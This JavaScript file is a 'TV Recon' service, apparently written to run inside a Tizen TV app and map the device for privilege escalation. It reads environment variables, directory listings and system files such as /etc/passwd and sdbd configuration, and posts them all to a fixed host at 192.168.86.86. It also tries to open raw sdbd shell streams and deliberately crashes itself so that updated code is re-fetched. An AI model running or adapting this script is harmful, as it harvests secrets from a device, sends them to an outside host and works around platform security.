/* TV Recon service v2 (SAFE) — no process spawning.
 * The v1 code included child_process.exec probes; the service process died
 * right after running them (platform security response or runtime crash).
 * This version probes everything reachable without spawning processes.
 * ES5 only (Tizen service runtime is Node.js v4.4.3-era).
 */
'use strict';

var MAC = '192.168.86.86';
var MAC_PORT = 8080;

function post(tag, data) {
    try {
        var http = require('http');
        var body = JSON.stringify({ tag: tag, data: data });
        var req = http.request({
            host: MAC, port: MAC_PORT, path: '/report', method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
        });
        req.on('error', function () {});
        req.end(body);
    } catch (e) {
        try { console.log('post fail: ' + e); } catch (e2) {}
    }
}

function T(fn) { try { return fn(); } catch (e) { return 'ERR:' + (e && e.message ? e.message : String(e)); } }

console.log('TV Recon service v2 (safe) starting');
post('service-hello', { time: new Date().toISOString(), msg: 'safe agent online', code: 'v2' });

/* 1. runtime environment */
post('env', {
    node: T(function () { return process.version; }),
    versions: T(function () { return process.versions; }),
    arch: T(function () { return process.arch; }),
    platform: T(function () { return process.platform; }),
    pid: process.pid,
    cwd: T(function () { return process.cwd(); }),
    uid: T(function () { return process.getuid ? process.getuid() : 'no getuid'; }),
    gid: T(function () { return process.getgid ? process.getgid() : 'no getgid'; }),
    execPath: T(function () { return process.execPath; }),
    argv: T(function () { return process.argv; }),
    env: T(function () { return process.env; })
});

/* 2. module availability — REQUIRE ONLY (no execution; child_process intentionally skipped this cycle) */
['fs', 'path', 'http', 'https', 'net', 'os', 'crypto', 'vm', 'dns', 'zlib',
 'events', 'stream', 'util', 'assert', 'tls', 'dgram',
 'adbhost', 'express', 'ws', 'node-fetch'].forEach(function (m) {
    post('module', { name: m, available: T(function () { require(m); return 'YES'; }) });
});

/* 3. filesystem enumeration (read-only) */
var fs = T(function () { return require('fs'); });
if (fs && fs.readdirSync) {
    ['/', '/bin', '/sbin', '/usr/bin', '/etc', '/opt', '/opt/etc', '/opt/usr',
     '/home', '/home/owner', '/home/owner/share', '/tmp', '/dev', '/proc',
     '/opt/usr/apps', '/opt/usr/home', '/etc/sysmgr', '/rom', '/mnt'].forEach(function (d) {
        post('fs', { dir: d, listing: T(function () { return fs.readdirSync(d).slice(0, 100); }) });
    });
    ['/etc/passwd', '/etc/group', '/etc/hostname', '/etc/hosts', '/etc/fstab',
     '/etc/sdbd.conf', '/opt/etc/sdbd.conf', '/proc/mounts', '/proc/cpuinfo',
     '/proc/meminfo', '/proc/self/status', '/proc/self/cmdline', '/proc/version',
     '/etc/tizen-build-info', '/etc/version', '/etc/smack/accesses',
     '/opt/etc/multi-point/lhd', '/rom/'].forEach(function (f) {
        post('file', { path: f, content: T(function () { return fs.readFileSync(f, 'utf8').slice(0, 5000); }) });
    });
}

/* 4. tizen API surface in service context */
post('tizen', {
    hasTizen: typeof tizen !== 'undefined',
    keys: T(function () { return typeof tizen !== 'undefined' ? Object.keys(tizen) : 'n/a'; }),
    appinfo: T(function () { return tizen.application.getAppInfo(); }),
    capabilities: T(function () { return tizen.systeminfo.getCapabilities(); })
});

/* 5. sdbd probes via bundled adbhost (JS-only, no process spawn) */
try {
    var adbhost = require('adbhost');
    var client = adbhost.createConnection({ host: '127.0.0.1', port: 26101 });
    var s1 = client.createStream('shell:0 vd_applist');
    var out1 = '';
    s1.on('data', function (d) { out1 += d.toString(); });
    s1.on('end', function () { post('sdbd-applist', { ok: true, len: out1.length, head: out1.slice(0, 400) }); });
    s1.on('error', function (e) { post('sdbd-applist', { ok: false, error: String(e) }); });

    var s2 = client.createStream('shell:id');
    var out2 = '';
    s2.on('data', function (d) { out2 += d.toString(); });
    s2.on('end', function () { post('sdbd-raw-shell', { ok: out2.length > 0, output: out2.slice(0, 400) }); });
    s2.on('error', function (e) { post('sdbd-raw-shell', { ok: false, error: String(e) }); });
} catch (e) {
    post('sdbd', { error: String(e) });
}

console.log('TV Recon v2 (safe): all probes dispatched');

/* Mark crashed so the page's StartService timer re-fetches fresh code next cycle */
throw new Error('RECON_CYCLE_COMPLETE');
